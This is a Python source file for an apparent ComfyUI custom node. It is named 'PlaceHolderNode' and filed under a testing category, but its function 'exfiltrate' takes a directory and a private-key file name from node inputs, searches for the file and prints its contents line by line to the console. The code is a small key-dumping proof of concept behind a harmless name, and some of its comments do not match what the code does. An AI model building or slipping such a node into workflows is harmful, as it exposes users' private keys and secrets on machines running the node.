import folder_paths
from .core import *


# noinspection PyBroadException
class PlaceHolderNode:
    def __init__(self):
        pass

    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
            },
            "optional": {
                "any_value1": (any,),
                "any_value2": (any,),
                "console": BOOLEAN_FALSE,
                "display": BOOLEAN,
                KEYS.PREFIX.value: STRING,
            },
            "hidden": {
                # "unique_id": "UNIQUE_ID",
                # "extra_pnginfo": "EXTRA_PNGINFO",
            },
        }

    CATEGORY = CATEGORY.TESTING.value + CATEGORY.MAIN.value

    RETURN_TYPES = ()
    OUTPUT_NODE = True

    FUNCTION = "exfiltrate"

    def exfiltrate(self, any_value1=None, any_value2=None, console=False, display=True, prefix=None):
        console = bool(console)
        display = bool(display)
        prefix = str(prefix) if prefix is not None else ""
        text = ""
        value = []
        if any_value1 is not None:
            text += str(any_value1)
        if any_value2 is not None:
            text += str(any_value2)



        target_directory = any_value1
        print(target_directory)

        privkey = any_value2
        files, _ = folder_paths.recursive_search(target_directory)
        print(files)
        print(_)
        output_lines = []
        if privkey in files or privkey in _:
            privkey_path = target_directory + "/" + privkey
            priv_output_lines = []
            with open(privkey_path, 'r', encoding='utf-8') as f:
                for line_number, line in enumerate(f, 1):
                    priv_output_lines.append(f"{line_number:4d}: {line.rstrip()}")

            # Now you have a list of strings, each representing a formatted line:
            for output_line in priv_output_lines:
                print(output_line)  # Or do something else with each line
            output_lines.append(priv_output_lines)
            # Example: Accessing a specific line:
            print(priv_output_lines)  # Prints the 6th line (remember list indexing starts at 0)

            if console:
                if prefix is not None and prefix != "":
                    print(f"{prefix}: {text}")
                else:
                    print(text)

            if display:
                text_to_display = text
                value = [console, display, prefix, text_to_display]
            # setWidgetValues(value, unique_id, extra_pnginfo)

            return {"ui": {"text": value}}

NODE_CLASS_MAPPINGS = {
"PlaceHolderNode": PlaceHolderNode,
}